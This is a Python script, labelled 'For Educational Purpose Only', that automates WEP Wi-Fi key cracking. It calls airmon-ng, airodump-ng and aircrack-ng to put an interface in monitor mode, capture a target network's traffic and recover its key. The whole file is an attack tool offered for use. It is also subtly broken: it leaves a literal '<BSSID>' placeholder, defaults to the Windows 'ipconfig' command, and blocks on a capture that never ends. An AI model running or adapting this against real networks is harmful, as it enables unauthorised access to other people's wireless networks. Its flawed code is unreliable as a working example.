#Crack WEP Wifi Networks using your Linux Systems in conjunction with Aircrack-ng using Python.
import subprocess
import pyfiglet
import time
import re

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print("Error:", e)
        return None

def get_wifi_interface():
    # Run ifconfig to find the name of the wireless interface

    banner = pyfiglet.figlet_format("WEP Cracker")
    # print(banner)
    print(f"\033[92m {banner} \033[0m")
    
    print("For Educational Purpose Only. Author : Roshan Bhatia IG @2kwattz\n")
    time.sleep(1)

    wifiInterfaceCommand = input("Based on your OS. What is your Custom Wifi Interface Command? Eg: ifconfig,ip etc\nLeave blank for default command ")
    if not wifiInterfaceCommand.strip():
        defaultCommand = 'ipconfig'
    else:
        defaultCommand = wifiInterfaceCommand

    output = run_command([f"{defaultCommand}"])
    if output:
        # Use regular expression to find the wireless interface name
        match = re.search(r'wlan\d', output)
        if match:
            return match.group(0)
    return None

def put_interface_monitor_mode(interface):
    # Put the wireless interface into monitor mode using airmon-ng
    run_command(["sudo", "airmon-ng", "start", interface])

def capture_packets(interface, channel):
    # Use airodump-ng to capture packets on the target channel
    run_command(["sudo", "airodump-ng", "-c", str(channel), "--bssid", "<BSSID>", "-w", "capture", interface])

def crack_wep():
    # Use aircrack-ng to crack the WEP key from the captured packets
    run_command(["sudo", "aircrack-ng", "capture-01.cap"])

def main():
    # Get the name of the wireless interface
    interface = get_wifi_interface()
    if not interface:
        print("Wireless interface not found.")
        return

    # Put the wireless interface into monitor mode
    put_interface_monitor_mode(interface)

    # Set the target channel and capture packets

    targetChannel = int(input("Enter Target Channel\n"))

    channel = targetChannel  # Change to the channel of your target network
    capture_packets(interface, channel)

    # Crack the WEP key
    crack_wep()

if __name__ == "__main__":
    main()
